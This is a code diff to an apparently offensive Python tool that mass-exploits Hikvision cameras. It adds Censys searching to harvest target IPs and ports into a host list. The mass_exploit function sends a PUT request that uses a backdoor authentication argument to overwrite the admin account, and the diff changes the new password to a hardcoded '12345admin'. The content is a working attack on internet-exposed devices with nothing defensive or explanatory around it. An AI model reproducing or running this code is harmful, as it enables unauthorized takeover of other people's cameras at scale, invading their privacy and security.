@@ -10,6 +10,10 @@ import requests
 import re
 import subprocess
 import random
+import json
+import censys
+import censys.ipv4
+from censys.base import CensysException
 
 global path
 global host
@@ -64,6 +68,33 @@ def gather_host_shodan():
         except KeyboardInterrupt:
             print t.red("\n[---]exiting now[---]")
 
+def gather_host_censys():
+    censys_list = open(path+"/censys_api.txt","r").read().splitlines()
+    if censys_list == []:
+        print(t.red('no censys api found, please insert a valid one'))
+        api_censys_uid = raw_input(t.red('[****]')+'type here uid:')
+        api_censys_scrt = raw_input(t.red('[****]')+'type here secret:')
+        with open(path+ "/censys_api.txt","wb") as api:
+            api.write(api_censys_uid + "\n" + api_censys_scrt)
+    else:
+        uid = censys_list[0]
+        secret = censys_list[1]
+        query = raw_input(t.blue('[')+t.green('+')+t.blue(']')+t.green('enter a valid query:'))
+        try:
+            for record in censys.ipv4.CensysIPv4(api_id=uid, api_secret=secret).search(query):
+                ip = record['ip']
+                port = record['protocols']
+                port_raw = port[0]
+                port = re.findall(r'\d+', port_raw)
+                with open(path + '/host.txt',"a") as cen:
+                    cen.write(ip +":" + str(port[0]))
+                    cen.write("\n")
+        except CensysException:
+            pass
+                
+                
+    
+
 
 
 def mass_exploit():
@@ -80,13 +111,13 @@ def mass_exploit():
         target_host = match1.group()
         port_raw = match2.group()
         port = port_raw[1:]
-        newPass = raw_input(t.red('[*]'+'please choose a new password:'))
+        newPass = "12345admin"
         userID = "1"
         userName = "admin"
         userXML = '<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">''.<id>'+ userID + '</id>.<userName>'+ userName + '</userName>.<password>'+ newPass + '</password>.</User>'
         URLBase = "http://"+target_host+ ":" + str(port) + "/"
         URLUpload = URLBase + "Security/users/1?" + BackdoorAuthArg
-        requests.put(URLUpload, data=userXML).text
+        x = requests.put(URLUpload, data=userXML).text
         a += 1
 
 def select_host_exploit():
@@ -275,7 +306,8 @@ def response():
         gather_host_shodan()
         response()
     elif str(usage_str) == "2":
-        print"WIP"
+        gather_host_censys()
+        response()
     elif str(usage_str) == "3":
         scan()
         response()
